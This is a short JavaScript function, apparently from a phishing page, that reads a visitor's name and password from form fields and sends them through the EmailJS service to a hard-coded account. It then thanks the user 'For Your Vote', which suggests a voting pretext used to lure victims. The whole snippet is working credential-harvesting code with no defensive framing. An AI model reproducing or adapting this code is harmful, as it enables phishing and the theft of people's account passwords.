function sendMail() {
  let params = {
      from_name: document.getElementById("name").value,
      Pass_user: document.getElementById("pass").value,
  };

  emailjs.send("service_c5buabe", "template_rjpj60s", params)
      .then((response) => {
          alert("Thanks For Your Vote"); // This will be called if the email is sent successfully
      })
      .catch((error) => {
          console.error("Failed to send email. Error:", error); // Handle any errors
      });
}